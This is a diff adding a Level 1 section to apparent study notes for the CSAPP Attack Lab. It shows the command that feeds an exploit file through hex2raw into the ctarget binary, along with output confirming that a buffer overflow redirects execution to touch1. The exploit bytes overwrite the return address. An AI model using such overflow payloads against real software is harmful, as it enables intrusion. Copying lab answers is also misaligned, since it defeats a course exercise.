@@ -316,3 +316,17 @@ End of assembler dump.
   401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
   40198c:	48 83 c4 08          	add    $0x8,%rsp
 ~~~
+
+# Level1
+~~~shell
+~/new_space/CSAPP_Lab/Attack/target1 (master*) » cat exploit.txt | ./hex2raw | ./ctarget -q         czy@czy-307-thinkcentre-m720q-n000
+Cookie: 0x59b997fa
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:1:41 41 41 42 41 41 43 41 41 44 41 41 45 41 41 46 41 41 47 41 41 48 41 41 49 41 41 4A 41 41 4B 41 41 4C 41 41 4D 41 41 4E C0 17 40 00
+~~~
+
